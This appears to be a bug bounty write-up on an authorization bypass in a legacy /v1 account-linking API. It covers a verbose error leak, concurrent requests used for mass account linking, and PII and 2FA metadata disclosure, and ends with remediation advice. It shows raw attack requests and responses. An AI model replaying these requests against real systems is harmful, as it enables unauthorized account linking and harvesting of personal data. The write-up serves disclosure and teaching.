---

title: "Legacy API Authorization Bypass — Race Condition Mass Linking & PII Harvesting"

date: 2026-08-23

categories: [Bug Bounty, Web, API Security, Access Control]

tags: [idor, bola, broken-access-control, api, race-condition, pii, authorization, legacy-api]

image:
path: /assets/api-chain/cover.png

---

# 🔗 Legacy API Authorization Bypass — Race Condition Mass Linking & PII Harvesting

## 1️⃣ Initial Reconnaissance

While testing the application's organization and user-management functionality, I discovered an interesting API flow around account invitations and organization membership.

The application exposed a modern `/v2` API:

```http
POST /api/v2/organization/invitations
```

A successful invitation response returned an `accountId` using the standard UUID format.

![Desktop View](/assets/api-chain/1.png){: width="700" height="400" .normal }

The returned UUID immediately became an interesting object for further authorization testing.

> **Testing mindset:** whenever an application exposes an object identifier such as an `accountId`, I always check whether that identifier is properly bound to the authenticated user's organization and permissions.

---

## 2️⃣ Information Leakage Reveals a Legacy Endpoint

During invitation testing, a malformed request produced a verbose error response.

```http
POST /api/v2/organization/invitations
```

The response contained an internal debug hint referencing a legacy `/v1` endpoint:

```json
{
  "error": "INVALID_PAYLOAD",
  "message": "Failed to process invitation via v2 gateway.",
  "debugHint": "Legacy applications should fallback to POST /api/v1/organization/link-account using target account UUID."
}
```

![Desktop View](/assets/api-chain/2.png){: width="700" height="400" .normal }

🚨 This was an important discovery.

The application was actively exposing information about an older API implementation.

This suggested that the `/v1` and `/v2` implementations might not enforce authorization consistently.

---

## 3️⃣ Comparing `/v2` and `/v1` Authorization

The next step was to test the same account-linking operation through both API versions.

### Modern `/v2` Endpoint

I first attempted to link an arbitrary account using:

```http
POST /api/v2/organization/link-account
```

with:

```json
{
  "accountId": "550e8400-e29b-41d4-a716-446655440000",
  "supplierId": "789880"
}
```

The server correctly rejected the request:

```http
HTTP/2 403 Forbidden
```

```json
{
  "error": "UNAUTHORIZED_ACTION",
  "message": "You are not authorized to associate this account with this organization."
}
```

![Desktop View](/assets/api-chain/3.png){: width="700" height="400" .normal }

✅ The modern endpoint appeared to enforce authorization correctly.

But then I tested the legacy endpoint.

---

## 4️⃣ Legacy `/v1` Authorization Bypass

I sent the same logical request through:

```http
POST /api/v1/organization/link-account
```

The request was accepted:

```http
HTTP/2 200 OK
```

```json
{
  "status": "SUCCESS",
  "message": "Account successfully linked to organization 789880",
  "accountId": "550e8400-e29b-41d4-a716-446655440000"
}
```

![Desktop View](/assets/api-chain/4.png){: width="700" height="400" .normal }

🚨 This confirmed a **Broken Object Level Authorization (BOLA)** vulnerability.

The `/v2` implementation checked whether the authenticated user was authorized to associate the target account, while the legacy `/v1` implementation accepted the arbitrary `accountId`.

The critical difference was:

```text
/v2  → Authorization enforced → 403
/v1  → Authorization missing   → 200
```

---

## 5️⃣ Race Condition — Mass Account Linking

The next question was whether the vulnerable endpoint could be abused repeatedly.

The legacy endpoint did not appear to enforce effective synchronization or sufficient request throttling around account-linking operations.

I therefore tested concurrent HTTP/2 requests rather than sending requests sequentially.

Example request stream:

```http
POST /api/v1/organization/link-account HTTP/2

{"accountId":"550e8400-e29b-41d4-a716-446655440001","supplierId":"789880"}
```

```http
POST /api/v1/organization/link-account HTTP/2

{"accountId":"550e8400-e29b-41d4-a716-446655440002","supplierId":"789880"}
```

```http
POST /api/v1/organization/link-account HTTP/2

{"accountId":"550e8400-e29b-41d4-a716-446655440003","supplierId":"789880"}
```

The server processed the requests concurrently:

```http
HTTP/2 200 OK
```

```json
{"status":"SUCCESS","accountId":"550e8400-e29b-41d4-a716-446655440001"}
```

```json
{"status":"SUCCESS","accountId":"550e8400-e29b-41d4-a716-446655440002"}
```

```json
{"status":"SUCCESS","accountId":"550e8400-e29b-41d4-a716-446655440003"}
```

![Desktop View](/assets/api-chain/5.png){: width="700" height="400" .normal }

🔥 This demonstrated that the authorization bypass could be combined with a **race condition** to perform mass account-linking operations.

The vulnerability was therefore no longer limited to a single unauthorized account association.

---

## 6️⃣ Post-Exploitation — Profile Data

After an account was linked, I tested whether the newly associated account could be queried through other legacy endpoints.

The first endpoint exposed profile information:

```http
GET /api/v1/organization/members/{accountId}/profile
```

The response contained:

```json
{
  "accountId": "550e8400-e29b-41d4-a716-446655440000",
  "firstName": "John",
  "middleName": "Alexander",
  "lastName": "Doe"
}
```

![Desktop View](/assets/api-chain/6.png){: width="700" height="400" .normal }

This exposed the complete name associated with the target account.

---

## 7️⃣ Contact Information Disclosure

The next endpoint was:

```http
GET /api/v1/organization/members/{accountId}/contact
```

It returned the account's primary email address:

```json
{
  "accountId": "550e8400-e29b-41d4-a716-446655440000",
  "email": "account@example.com"
}
```

![Desktop View](/assets/api-chain/7.png){: width="700" height="400" .normal }

This increased the impact from unauthorized account association to **PII disclosure**.

---

## 8️⃣ Security Metadata Disclosure

Finally, I tested the legacy security endpoint:

```http
GET /api/v1/organization/members/{accountId}/security
```

The endpoint exposed security and membership metadata:

```json
{
  "accountId": "550e8400-e29b-41d4-a716-446655440000",
  "lastLogin": "Saturday, August 1st, 2026 at 6:43:36 PM GMT+03:00",
  "twoFactorStatus": "Enabled",
  "twoFactorType": "Authenticator App",
  "organizationMembership": [
    "Org_789880",
    "Org_100293"
  ]
}
```

![Desktop View](/assets/api-chain/8.png){: width="700" height="400" .normal }

🚨 This exposed significantly more sensitive information, including:

* Last login timestamp
* 2FA status
* 2FA method
* Organization memberships

At this point, the attack chain demonstrated unauthorized access to both **identity information and security-related metadata**.

---

## 9️⃣ Complete Attack Chain

The final attack chain looked like this:

```text
Verbose Error
      ↓
Legacy /v1 Endpoint Discovery
      ↓
UUID / Account Identifier
      ↓
/v2 Authorization Check → 403
      ↓
Switch to /v1
      ↓
Authorization Bypass
      ↓
Unauthorized Account Linking
      ↓
Concurrent Requests / Race Condition
      ↓
Mass Account Linking
      ↓
/profile
      ↓
Full Name Disclosure
      ↓
/contact
      ↓
Email Disclosure
      ↓
/security
      ↓
2FA + Login + Organization Metadata
```

![Desktop View](/assets/api-chain/9.png){: width="900" height="500" .normal }

This demonstrated how several individually interesting weaknesses could be chained together into a much more serious security impact.

---

## 🎯 Impact

The vulnerability chain allowed an attacker to:

* Discover a legacy account-linking endpoint through verbose error handling.
* Bypass authorization checks through the legacy `/v1` implementation.
* Forcefully associate unauthorized accounts with an attacker-controlled organization.
* Abuse concurrent requests to perform mass account-linking operations.
* Access profile information belonging to unauthorized users.
* Retrieve primary email addresses.
* Retrieve last-login information.
* Determine whether 2FA was enabled.
* Identify the configured 2FA method.
* Enumerate organization memberships.

The combined impact was assessed as:

**CVSS v3.1: 9.1 — Critical**

```text
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
```

---

## 🛡️ Root Cause

The primary root cause was inconsistent security controls between API versions.

The modern `/v2` endpoint performed authorization checks, while the legacy `/v1` implementation did not apply equivalent authorization controls.

The vulnerable design effectively allowed the server to trust a client-controlled object identifier:

```text
accountId → link account
```

without verifying:

```text
Does the authenticated user have permission to perform this operation
on this specific account?
```

The race condition further demonstrated insufficient synchronization around the account-linking operation.

---

## 🔧 Recommendations

### 1️⃣ Decommission Legacy APIs

Remove obsolete `/v1` endpoints whenever they are no longer required.

If legacy endpoints must remain available, they should use the same authorization middleware and security controls as current API versions.

### 2️⃣ Enforce Object-Level Authorization

Every account-linking operation should verify authorization server-side.

For example:

```text
Authenticated User
        ↓
Organization
        ↓
Target Account
        ↓
Explicit Authorization Check
        ↓
Allow / Deny
```

Never rely solely on the submitted `accountId`.

### 3️⃣ Protect Organization Membership Operations

Only authorized organization administrators should be able to associate accounts.

The backend should verify that the target account is legitimately eligible for the requested organization membership.

### 4️⃣ Prevent Race Conditions

Use atomic transactions, appropriate database constraints, and locking mechanisms where necessary.

Critical membership operations should remain consistent even when multiple requests arrive simultaneously.

### 5️⃣ Implement Rate Limiting

Apply rate limits to:

* Invitation endpoints
* Account-linking endpoints
* Member lookup endpoints
* Sensitive metadata endpoints

Rate limiting should apply consistently across API versions.

### 6️⃣ Remove Debug Information

Production error responses should never expose:

* Internal API paths
* Legacy endpoints
* Internal documentation
* Debug hints
* Implementation details

Return a generic error message instead.

### 7️⃣ Secure Member Data Endpoints

Every `/profile`, `/contact`, and `/security` request should independently verify whether the authenticated user is authorized to access the requested account.

Authorization should **not** be inherited merely because an account identifier was previously supplied to another endpoint.

---

## 🧠 Key Bug Bounty Takeaways

This finding reinforced several important lessons when testing APIs.

### 1. Always Compare API Versions

If you find:

```text
/v1
/v2
/v3
```

don't assume they implement identical authorization logic.

Test the same functionality across versions.

### 2. Treat IDs as Authorization Boundaries

Whenever an API accepts:

```json
{
  "accountId": "..."
}
```

ask:

> What prevents me from replacing this ID with another user's ID?

### 3. Test Error Responses

Verbose errors can reveal:

* Hidden endpoints
* Legacy APIs
* Internal documentation
* Framework information
* Database behavior
* Feature flags

### 4. Think in Attack Chains

A single authorization bypass may initially look like a medium-impact issue.

But combining:

```text
Information Leak
        +
Authorization Bypass
        +
Race Condition
        +
BOLA
        +
PII Disclosure
```

can dramatically increase the overall impact.

### 5. Stop Once Impact Is Proven

After demonstrating mass unauthorized linking and sensitive-data access, testing was terminated to avoid unnecessary modification of additional accounts and to remain within responsible disclosure boundaries.

---

## 🏁 Conclusion

What initially looked like a simple legacy API discovery eventually became a multi-stage authorization attack chain.

The most important lesson was that **security controls must remain consistent across every API version**.

A secure `/v2` endpoint does not protect an application if an older `/v1` implementation still exposes the same functionality without equivalent authorization checks.

The final chain was:

```text
Debug Information Leak
        ↓
Legacy API Discovery
        ↓
Authorization Bypass
        ↓
Race Condition
        ↓
Mass Account Linking
        ↓
BOLA
        ↓
PII Disclosure
        ↓
Security Metadata Disclosure
```

**Overall Severity: Critical — CVSS 9.1**

> Always test the old endpoints. Sometimes the newest API is secure — while the legacy one is still wide open.

---

# HAPPY HACKING 😈
